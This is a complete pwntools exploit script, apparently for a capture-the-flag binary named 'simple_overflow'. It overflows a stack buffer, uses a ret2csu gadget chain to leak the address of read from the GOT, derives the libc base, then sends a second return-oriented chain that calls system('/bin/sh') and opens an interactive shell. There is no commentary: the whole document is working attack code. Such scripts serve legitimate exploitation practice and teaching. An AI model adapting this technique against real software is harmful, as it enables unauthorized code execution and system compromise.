from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

p = process("./simple_overflow")
e = ELF("./simple_overflow")
libc = e.libc
r = ROP(e)

#context.log_level = 'debug'
#gdb.attach(p)

puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_got = e.got['read']

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
binsh_offset = list(libc.search(b"/bin/sh\00"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]

csu_init1 = 0x40132a
csu_init2 = 0x401310
main = e.symbols['main']
bss = e.bss()
dummy = b'A' * 8


def rtc_chain(arg1, arg2, arg3, func):
    return p64(0) + p64(1) + p64(arg1) + p64(arg2) + p64(arg3) + p64(func) + p64(csu_init2)


def trigger():
    p.sendlineafter("len??\n", str(2222222222))

trigger()
payload = b'A' * 24

# puts(read@got)
payload += p64(csu_init1)
payload += rtc_chain(read_got, 0, 0, puts_got)


# read(0, bss, 8)
payload += p64(0) * 7
payload += p64(main)

#pause()
p.sendlineafter("name??\n", payload)

p.recv(28)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = lb + binsh_offset

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)


trigger()
payload = b'A' * 24

# system("/bin/sh")
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

#pause()
p.sendlineafter("name??\n", payload)
p.recv(28)

p.interactive()